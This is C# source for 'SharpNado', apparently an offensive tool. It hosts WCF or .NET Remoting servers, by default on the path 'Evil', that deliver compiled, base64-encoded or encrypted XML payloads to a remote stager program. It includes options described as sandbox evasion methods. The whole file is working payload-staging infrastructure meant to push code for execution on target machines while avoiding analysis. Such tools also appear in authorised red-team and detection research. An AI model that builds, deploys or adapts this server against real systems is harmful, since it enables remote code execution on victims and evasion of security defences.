using System;
using System.IO;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.ServiceModel;
using System.Threading;

public class Program
{
    static void Main(string[] args)
    {
        if (args.Length <= 0)
        {
            art();
        }
        //While Loop for SharpNado
        while (true)
        {
            Console.Write("SharpNado:> ");
            //Get command from user and process
            String command = Console.ReadLine();
            Char delimiter = ' ';
            String[] request = command.Split(delimiter);

            //Set Variables
            //Exits application
            if (request[0].ToLower() == "exit")
            {
                Environment.Exit(0);
            }
            //Shows service options that can be set
            else if (request[0].ToLower() == "show" && request[1].ToLower() == "serviceoptions")
            {
                serviceOptions();
            }
            //Shows payload options that can be set
            else if (request[0].ToLower() == "show" && request[1].ToLower() == "payloadoptions")
            {
                payloadOptions();
            }
            //Shows XML payloads available in payload directory that can be set by user
            else if (request[0].ToLower() == "show" && request[1].ToLower() == "payloads")
            {
                //show payload names in payload directory
                Console.WriteLine();
                DirectoryInfo dirInfo = new DirectoryInfo(payloadDir);
                FileInfo[] Files = dirInfo.GetFiles("*.xml");
                foreach (FileInfo file in Files)
                {
                    Console.WriteLine(file.Name);
                }
                Console.WriteLine();
            }
            //Shows help menu
            else if (request[0].ToLower() == "help" || request[0] == "?")
            {
                help();
            }
            //Set options
            else if (request[0].ToLower() == "set")
            {
                if (request[1].ToLower() == "type")
                {
                    serviceValue = request[2];
                }
                if (request[1].ToLower() == "protocol")
                {
                    protocolValue = request[2];
                }
                if (request[1].ToLower() == "srvhost")
                {
                    srvhost = request[2];
                }
                if (request[1].ToLower() == "port")
                {
                    port = request[2];
                }
                if (request[1].ToLower() == "uripath")
                {
                    uripath = request[2];
                }
                if (request[1].ToLower() == "compile_1")
                {
                    xmlPayload1 = request[2];
                }
                if (request[1].ToLower() == "compile_2")
                {
                    xmlPayload2 = request[2];
                }
                if (request[1].ToLower() == "base64_1")
                {
                    xmlPayload3 = request[2];
                }
                if (request[1].ToLower() == "base64_2")
                {
                    xmlPayload4 = request[2];
                }
                if (request[1].ToLower() == "sandbox_1")
                {
                    xmlPayload5 = request[2];
                }
                if (request[1].ToLower() == "sandbox_2")
                {
                    xmlPayload6 = request[2];
                }
                if (request[1].ToLower() == "encrypt")
                {
                    xmlPayload7 = request[2];
                }
                if (request[1].ToLower() == "pass")
                {
                    xmlPayload8 = request[2];
                }
                if (request[1].ToLower() == "payload_directory")
                {
                    payloadDir = request[2];
                }
            }
            //Starts service type/protocol depending on options selected by user
            else if (request[0].ToLower() == "run")
            {
                if (serviceValue == "wcf")
                {
                    if (protocolValue == "http")
                    {
                        keepThread = true;
                        Thread thread = new Thread(wcfHTTP);
                        thread.IsBackground = true;
                        thread.Start();
                    }
                    if (protocolValue == "tcp")
                    {
                        keepThread = true;
                        Thread thread = new Thread(wcfTCP);
                        thread.IsBackground = true;
                        thread.Start();
                    }
                }
                else if (serviceValue == "net")
                {
                    if (protocolValue == "tcp")
                    {
                        keepThread = true;
                        Thread thread = new Thread(netRemotingTCP);
                        thread.IsBackground = true;
                        thread.Start();
                    }
                }
            }
            //Stops running service
            else if (request[0].ToLower() == "stop")
            {
                keepThread = false;
            }
            else
            {
                Console.WriteLine("Bad syntax");
            }
        }//End While Loop
    }//End Main
    //WCF Server HTTP
    private static void wcfHTTP()
    {
        Uri baseAddress = new Uri("http://" + srvhost + ":" + port + "/" + uripath);
        using (ServiceHost host = new ServiceHost(typeof(WCF_Server), baseAddress))
        {
            host.Open();
            Console.WriteLine("WCF HTTP service listening on {0} via {1}", baseAddress, "Interface2");
            Console.Write("SharpNado:> ");
            while (keepThread)
            {
                Thread.Sleep(5000);
            }
        }
    }//End public static void wcfHTTP   
    //WCF Server TCP
    private static void wcfTCP()
    {
        var netTcpBinding = new NetTcpBinding(SecurityMode.None)
        {
            PortSharingEnabled = true
        };
        var netTcpAdddress = new Uri("net.tcp://" + srvhost + ":" + port + "/");
        var tcpHost = new ServiceHost(typeof(WCF_Server), netTcpAdddress);
        tcpHost.AddServiceEndpoint(typeof(Interface2), netTcpBinding, uripath);
        tcpHost.Open();
        Console.WriteLine("WCF TCP service listening on {0} via {1}", netTcpAdddress, "Interface2");
        Console.Write("SharpNado:> ");
        while (keepThread)
        {
            Thread.Sleep(5000);
        }
    }//End public static void wcfTCP
    //.NET Remoting Server TCP
    private static void netRemotingTCP()
    {
        TcpChannel tcpChannel = new TcpChannel(Convert.ToInt32(port));
        ChannelServices.RegisterChannel(tcpChannel, false);
        RemotingConfiguration.CustomErrorsMode = CustomErrorsModes.Off;
        WellKnownServiceTypeEntry RemObj = new WellKnownServiceTypeEntry(typeof(Net_Remoting_Server), uripath, WellKnownObjectMode.SingleCall);
        RemotingConfiguration.RegisterWellKnownServiceType(RemObj);
        Console.WriteLine(".NET Remoting TCP server started and using {0}", "Interface1");
        Console.Write("SharpNado:> ");
        while (keepThread)
        {
            Thread.Sleep(5000);
        }
    }//End public static void netRemotingTCP
    //Help Menu
    private static void help()
    {
        Console.WriteLine();
        Console.WriteLine("Help Options:");
        Console.WriteLine();
        Console.WriteLine("set                        Set service and payload options");
        Console.WriteLine("show serviceOptions        Show information pertaining to service options that can be set");
        Console.WriteLine("show payloadOptions        Show information pertaining to payload options that can be set");
        Console.WriteLine("show payloads              Lists available payloads in your set payload directory");
        Console.WriteLine("run                        Starts service instance - Multiple services can run simultaneously");
        Console.WriteLine("stop                       Stops ALL running services");
        Console.WriteLine("help || ?                  Shows help menu");
        Console.WriteLine("exit                       Exits application");
        Console.WriteLine();
    }
    //Show Info Menu
    private static void serviceOptions()
    {
        Console.WriteLine();
        Console.WriteLine("Service Options:");
        Console.WriteLine();
        var header1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "Name", "Required", "Value", "Discription");
        var header2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "----", "--------", "-----", "-----------");
        var serviceValue = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "type", "True", Program.serviceValue, "Sets server to use WCF interfaces or .NET Remoting");
        var serviceValue2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "interfaces. [wcf or net]");
        var protocolValue = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "protocol", "True", Program.protocolValue, "Sets protocol to use for WCF interfaces or .NET Remoting");
        var protocolValue2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "interfaces. [http or tcp] .NET Remoting only supports TCP");
        var ipValue = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "srvhost", "True", Program.srvhost, "Sets listening IP (Best to set in App.config file to make");
        var ipValue2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "sure IP binds correctly if using multiple IP addresses");
        var portValue1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "port", "True", Program.port, "Sets port to be used");
        var uriValue1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "uripath", "True", Program.uripath, "Sets URI path payloads will use to connect (Default = /Evil");
        Console.Write(header1);
        Console.WriteLine(header2);
        Console.Write(serviceValue);
        Console.WriteLine(serviceValue2);
        Console.Write(protocolValue);
        Console.WriteLine(protocolValue2);
        Console.Write(ipValue);
        Console.WriteLine(ipValue2);
        Console.WriteLine(portValue1);
        Console.WriteLine(uriValue1);
        Console.WriteLine();
    }
    private static void payloadOptions()
    {
        Console.WriteLine();
        Console.WriteLine("Payload Options:");
        Console.WriteLine();
        var header1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "Name", "Required", "Value", "Discription");
        var header2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "----", "--------", "-----", "-----------");
        var payload1Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "compile_1", "False", Program.xmlPayload1, "Sets XML payload to be executed by stager program calling");
        var payload1Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "1st compile method");
        var payload2Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "compile_2", "False", Program.xmlPayload2, "Sets XML payload to be executed by stager program calling");
        var payload2Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "2nd compile method");
        var payload3Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "base64_1", "False", Program.xmlPayload3, "Sets XML payload to be executed by stager program calling");
        var payload3Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "1st base64 method");
        var payload4Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "base64_2", "False", Program.xmlPayload4, "Sets XML payload to be executed by stager program calling");
        var payload4Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "2nd base64 method");
        var payload5Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "sandbox_1", "False", Program.xmlPayload5, "Sets 1st XML payload executed by stager program calling");
        var payload5Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "Sandbox method (if using both payloads must be set)");
        var payload6Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "sandbox_2", "False", Program.xmlPayload6, "Sets 2nd XML payload executed by stager program calling");
        var payload6Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "Sandbox method (if using both payloads must be set)");
        var payload7Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "encrypt", "False", Program.xmlPayload7, "Sets XML payload to be executed by stager program calling");
        var payload7Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "encrypt payload method");
        var payload8Value1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "pass", "False", Program.xmlPayload8, "Sets password to encypt and decrypt payload executed by");
        var payload8Value2 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "", "", "", "encrypt payload method (this must be set for encryption)");
        var payloadDirValue1 = String.Format("{0,-25}{1,-15}{2,-20}{3,-30}\n", "payload_directory", "True", Program.payloadDir, "Sets working payload directory");
        Console.Write(header1);
        Console.WriteLine(header2);
        Console.Write(payload1Value1);
        Console.WriteLine(payload1Value2);
        Console.Write(payload2Value1);
        Console.WriteLine(payload2Value2);
        Console.Write(payload3Value1);
        Console.WriteLine(payload3Value2);
        Console.Write(payload4Value1);
        Console.WriteLine(payload4Value2);
        Console.Write(payload5Value1);
        Console.WriteLine(payload5Value2);
        Console.Write(payload6Value1);
        Console.WriteLine(payload6Value2);
        Console.Write(payload7Value1);
        Console.WriteLine(payload7Value2);
        Console.Write(payload8Value1);
        Console.WriteLine(payload8Value2);
        Console.WriteLine(payloadDirValue1);
        Console.WriteLine();
    }
    private static void art()
    {
        string asci =
        @"

                      _____________                       _____   __      _________      
                      __  ___/__  /_______ __________________  | / /_____ ______  /_____ 
                      _____ \__  __ \  __ `/_  ___/__  __ \_   |/ /_  __ `/  __  /_  __ \
                      ____/ /_  / / / /_/ /_  /   __  /_/ /  /|  / / /_/ // /_/ / / /_/ /
                      /____/ /_/ /_/\__,_/ /_/    _  .___//_/ |_/  \__,_/ \__,_/  \____/ 
                                                  /_/                                   

                                                                    ";

        string console = "                                                 [v 1.0]@@" +
                          "                                       Written by anthemtotheego@@";

        console = console.Replace("@", System.Environment.NewLine);
        Console.WriteLine(asci);
        Console.WriteLine(console);
    }
    //Counter used for sandbox evasion methods - counts how many times sandbox remote method has been called
    //Can be used to kill service or gain insight about service calls
    public static int count = 0;
    //Used to kill server thread
    public static bool keepThread = true;
    //Variables used for setting payload options
    public static string xmlPayload1 = "";
    public static string xmlPayload2 = "";
    public static string xmlPayload3 = "";
    public static string xmlPayload4 = "";
    public static string xmlPayload5 = "";
    public static string xmlPayload6 = "";
    public static string xmlPayload7 = "";
    public static string xmlPayload8 = "";
    public static string payloadDir = @"..\..\..\Payloads\";
    //Variables used for setting service options
    public static string serviceValue = "wcf";
    public static string protocolValue = "http";
    public static string srvhost = "";
    public static string port = "";
    public static string uripath = "Evil";

}//End public class program

//WCF Public Server Interface
[ServiceContract]
public interface Interface2
{
    [OperationContract]
    String[] compile1();

    [OperationContract]
    String[] compile2();

    [OperationContract]
    String[] b64Assembly1();

    [OperationContract]
    String[] b64Assembly2();

    [OperationContract]
    String[] b64AssemblyLogic(string myLogic);

    [OperationContract]
    String[] b64AssemblyEncryptString();
}
//.Net Remoting Public Server Interface
public interface Interface1
{
    String[] compile1();
    String[] compile2();
    String[] b64Assembly1();
    String[] b64Assembly2();
    String[] b64AssemblyLogic(string myLogic);
    String[] b64AssemblyEncryptString();
}
